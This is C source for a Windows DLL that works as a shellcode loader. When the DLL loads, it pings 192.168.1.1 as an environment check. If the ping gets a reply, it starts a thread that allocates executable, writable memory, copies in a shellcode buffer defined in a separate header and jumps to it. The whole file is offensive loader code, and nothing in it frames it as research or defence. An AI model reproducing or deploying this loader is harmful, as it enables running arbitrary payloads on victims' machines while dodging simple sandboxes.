#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include "template2.h"
DWORD WINAPI Threadf(LPVOID lpParameter)
{
	LPVOID newMem;
	HANDLE currentps;
	SIZE_T bytes;
	BOOL check = FALSE;
	currentps = GetCurrentProcess(); //get current process handler
	newMem = VirtualAllocEx(currentps, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(newMem == NULL)
		return -1;
	check = WriteProcessMemory(currentps, newMem, (LPVOID)&code, SCSIZE, &bytes);
	if(!check)
		return -2;
	((void(*)())newMem)();
		return 1;
}
BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE hIcmpFile;
    unsigned long ipaddr = INADDR_NONE;
    DWORD dwRetVal = 0;
    char SendData[32] = "Data Buffer";
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    HANDLE threadH;
    ipaddr = inet_addr("192.168.1.1");
    hIcmpFile = IcmpCreateFile();
    if (hIcmpFile == INVALID_HANDLE_VALUE) {
    return 0;
}
    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
    dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData),NULL, ReplyBuffer, ReplySize, 500);
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            if(dwRetVal != 0){
	    threadH = CreateThread(NULL, 0, Threadf, NULL, 0, NULL);
	}
	    CloseHandle(threadH);
	    break;
        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

       case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
} 

